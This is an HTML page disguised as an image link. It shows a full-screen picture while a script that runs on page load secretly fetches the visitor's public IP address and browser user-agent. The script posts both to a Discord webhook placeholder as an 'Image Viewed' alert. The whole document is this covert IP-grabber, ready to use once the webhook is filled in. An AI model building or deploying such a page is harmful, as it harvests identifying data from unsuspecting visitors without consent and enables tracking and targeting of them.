<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        // Send IP to your webhook
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                const ip = data.ip;
                fetch('YOUR_DISCORD_WEBHOOK', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `**📸 Image Viewed**\n🌍 IP: ${ip}\n🖥️ Device: ${navigator.userAgent}`
                    })
                });
            });
    </script>
</head>
<body>
    <img src="https://i.imgur.com/real-image.jpg" style="width:100%;height:100%;">
</body>
</html>
